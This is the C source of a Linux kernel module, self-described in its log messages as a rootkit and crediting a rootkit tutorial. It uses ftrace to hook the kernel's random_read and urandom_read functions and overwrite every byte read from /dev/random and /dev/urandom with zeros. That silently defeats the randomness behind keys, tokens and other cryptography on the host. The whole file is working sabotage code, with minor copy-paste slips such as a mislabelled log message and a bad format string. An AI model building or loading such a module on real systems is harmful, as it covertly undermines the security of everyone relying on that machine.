/**
 * This file contains base code implemenration for interfering with char device drivers.
 * 
 * Sources : 
 * https://xcellerator.github.io/posts/linux_rootkits_04/
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>                   /* struct file, loff_t */
#include <linux/types.h>                /* ssize_t, size_t */
#include <linux/uaccess.h>              /* __user */
#include <linux/syscalls.h>             /* asmlinkage */
#include <linux/kallsyms.h>             /* kallsyms_lookup_name */

#include "../lib/hook/ftrace_helper.h"

#define MODNAME "Interfer"

MODULE_AUTHOR("Yekuuun");
MODULE_DESCRIPTION("Playing with char device drivers.");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.0.1");

static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

/**
 * Function hook for random_read()
 */
static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos){
    ssize_t bytes_read;
    long err;
    char *kbuf;

    bytes_read = orig_random_read(file, buf, nbytes, ppos);
    pr_info("[*] rootkit: intercepted read to /dev/random: %zd bytes\n",  bytes_read);

    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    if(!kbuf){
        pr_err("[!] Error allocating memory in %s\n", __func__);
        goto __END_READ_HOOK;
    }

    err = copy_from_user(kbuf, buf, (unsigned long)bytes_read);

    if(err){
        pr_err("[!] Error : %ld bytes could not be copied into kbuf\n", err);
        goto __END_READ_HOOK;
    }

    for(int i = 0; i < bytes_read; i++)
        kbuf[i] = 0x00;

    err = copy_to_user(buf, kbuf, bytes_read);
    if(err)
        pr_err("[!] Error : %ld bytes could not be copied to buf\n", err);
    
__END_READ_HOOK:
    if(kbuf)
        kfree(kbuf);

    return bytes_read;
}

/**
 * Function hook for random_read()
 */
static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos){
    ssize_t bytes_read;
    long err;
    char *kbuf;

    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
    pr_info("[*] rootkit: intercepted read to /dev/random: %zd bytes\n",  bytes_read);

    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    if(!kbuf){
        pr_err("[!] Error allocating memory in %s\n", __func__);
        goto __END_UREAD_HOOK;
    }

    err = copy_from_user(kbuf, buf, (unsigned long)bytes_read);

    if(err){
        pr_err("[!] Error : %ld bytes could not be copied into kbuf\n", err);
        goto __END_UREAD_HOOK;
    }

    for(int i = 0; i < bytes_read; i++)
        kbuf[i] = 0x00;

    err = copy_to_user(buf, kbuf, bytes_read);
    if(err)
        pr_err("[!] Error : %ld bytes could not be copied to buf\n", err);
    
__END_UREAD_HOOK:
    if(kbuf)
        kfree(kbuf);

    return bytes_read;
}

static struct ftrace_hook hooks[] = {
    HOOK("random_read", hook_random_read, &orig_random_read),
    HOOK("urandom_read", hook_urandom_read, &orig_urandom_read)
};


static int __init char_lkm_init(void){
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("[%s] Failed to install hooks: %d\n", MODNAME, err);
        return err;
    }

    pr_info("[%s] Module loaded, hooks installed.\n", MODNAME);
    return 0;
}

static void __exit char_lkm_exit(void){
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("[*s] Module unloaded, hooks removed.\n", MODNAME);
}

module_init(char_lkm_init);
module_exit(char_lkm_exit);

